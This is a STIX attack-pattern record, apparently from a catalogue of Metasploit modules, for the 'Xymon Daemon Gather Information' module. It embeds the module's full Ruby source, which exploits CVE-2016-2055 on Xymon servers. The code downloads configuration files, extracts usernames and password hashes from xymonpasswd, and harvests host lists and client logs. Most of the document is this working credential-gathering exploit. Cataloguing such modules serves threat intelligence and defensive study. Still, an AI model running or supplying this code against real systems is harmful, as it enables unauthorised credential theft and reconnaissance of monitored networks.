{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--571c2572-2911-4dad-b986-57025382e80d",
    "created": "2024-08-14T16:31:53.149967Z",
    "modified": "2024-08-14T16:31:53.149972Z",
    "name": "Xymon Daemon Gather Information",
    "description": " This module retrieves information from a Xymon daemon service (formerly Hobbit, based on Big Brother), including server configuration information, a list of monitored hosts, and associated client log for each host.  This module also retrieves usernames and password hashes from the `xymonpasswd` config file from Xymon servers before 4.3.25",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/gather/xymon_info.rb",
            "external_id": "xymon_info.rb"
        },
        {
            "source_name": "MarkusKrell",
            "external_id": "#CVE-2016-2055discovery"
        },
        {
            "source_name": "CVE",
            "external_id": "2016-2055"
        },
        {
            "source_name": "reference",
            "url": "https://lists.xymon.com/pipermail/xymon/2016-February/042986.html"
        },
        {
            "source_name": "reference",
            "url": "https://xymon.sourceforge.net/"
        },
        {
            "source_name": "reference",
            "url": "https://en.wikipedia.org/wiki/Xymon"
        },
        {
            "source_name": "reference",
            "url": "https://en.wikipedia.org/wiki/Big_Brother_(software)"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Auxiliary::Report\n\n  def initialize\n    super(\n      'Name'        => 'Xymon Daemon Gather Information',\n      'Description' => %q{\n        This module retrieves information from a Xymon daemon service\n        (formerly Hobbit, based on Big Brother), including server\n        configuration information, a list of monitored hosts, and\n        associated client log for each host.\n\n        This module also retrieves usernames and password hashes from\n        the `xymonpasswd` config file from Xymon servers before 4.3.25,\n        which permit download arbitrary config files (CVE-2016-2055),\n        and servers configured with `ALLOWALLCONFIGFILES` enabled.\n      },\n      'Author'      => [\n        'Markus Krell', # CVE-2016-2055 discovery\n        'bcoles'        # Metasploit\n      ],\n      'License'     => MSF_LICENSE,\n      'References'  =>\n        [\n          ['CVE', '2016-2055'],\n          ['PACKETSTORM', '135758'],\n          ['URL', 'https://lists.xymon.com/pipermail/xymon/2016-February/042986.html'],\n          ['URL', 'https://xymon.sourceforge.net/'],\n          ['URL', 'https://en.wikipedia.org/wiki/Xymon'],\n          ['URL', 'https://en.wikipedia.org/wiki/Big_Brother_(software)']\n        ]\n    )\n    register_options [Opt::RPORT(1984)]\n  end\n\n  def xymon_send(cmd)\n    vprint_status \"Sending: #{cmd}\"\n    connect\n    sock.puts cmd\n    sock.shutdown(:WR)\n    return sock.get(5)\n  ensure\n    disconnect\n  end\n\n  def run\n    res = xymon_send('ping').to_s\n\n    unless res.starts_with? 'xymond'\n      print_error 'Target is not a Xymon daemon'\n      return\n    end\n\n    version = res.scan(/^xymond ([\\d\\.]+)/).flatten.first\n\n    unless version\n      print_error 'Could not retrieve Xymon version'\n    end\n\n    print_status \"Xymon daemon version #{version}\"\n\n    service_data = {\n      address: rhost,\n      port: rport,\n      service_name: 'xymond',\n      protocol: 'tcp',\n      info: version,\n      workspace_id: myworkspace_id\n    }\n\n    xymond_service = report_service(service_data)\n\n    print_status 'Retrieving configuration files ...'\n\n    %w(xymonserver.cfg hosts.cfg xymonpasswd).each do |config|\n      res = xymon_send(\"config #{config}\").to_s\n\n      if res.blank?\n        print_error \"Could not retrieve #{config}\"\n        next\n      end\n\n      path = store_loot(\n        \"xymon.config.#{config.sub(/\\.cfg$/, '')}\",\n        'text/plain',\n        target_host,\n        res,\n        nil,\n        \"config #{config}\",\n        xymond_service\n      )\n\n      print_good \"#{config} (#{res.size} bytes) stored in #{path}\"\n\n      if config == 'xymonpasswd'\n        res.each_line.map {|l| l.strip}.reject{|l| l.blank? || l.starts_with?('#')}.each do |c|\n          user = c.split(':')[0].to_s.strip\n          hash = c.split(':')[1].to_s.strip\n\n          print_good(\"Credentials: #{user} : #{hash}\")\n\n          credential_data = {\n            module_fullname: fullname,\n            origin_type: :service,\n            private_data: hash,\n            private_type: :nonreplayable_hash,\n            jtr_format: Metasploit::Framework::Hashes.identify_hash(hash),\n            username: user\n          }.merge(service_data)\n\n          login_data = {\n            core: create_credential(credential_data),\n            status: Metasploit::Model::Login::Status::UNTRIED\n          }.merge(service_data)\n\n          create_credential_login(login_data)\n        end\n      end\n    end\n\n    print_status 'Retrieving host list ...'\n\n    res = xymon_send('hostinfo').to_s\n\n    if res.blank?\n      print_error 'Could not retrieve client host list'\n      return\n    end\n\n    path = store_loot(\n      'xymon.hostinfo',\n      'text/plain',\n      target_host,\n      res,\n      nil,\n      'hostinfo',\n      xymond_service\n    )\n\n    print_good \"Host info (#{res.size} bytes) stored in #{path}\"\n\n    hosts = res.each_line.map {|line| line.split('|').first}.reject {|host| host.blank?}\n\n    if hosts.empty?\n      print_error 'Found no client hosts'\n      return\n    end\n\n    print_good \"Found #{hosts.size} hosts\"\n\n    print_status 'Retrieving client logs ...'\n\n    hosts.each do |host|\n      res = xymon_send(\"clientlog #{host}\")\n\n      unless res\n        print_error \"Could not retrieve client log for #{host}\"\n        next\n      end\n\n      if res.blank?\n        print_status \"#{host} client log is empty\"\n        next\n      end\n\n      path = store_loot(\n        \"xymon.hosts.#{host}\",\n        'text/plain',\n        target_host,\n        res,\n        nil,\n        \"clientlog #{host}\",\n        xymond_service\n      )\n\n      print_good \"#{host} client log (#{res.size} bytes) stored in #{path}\"\n    end\n  rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout\n  rescue Timeout::Error => e\n    print_error(e.message)\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ]
}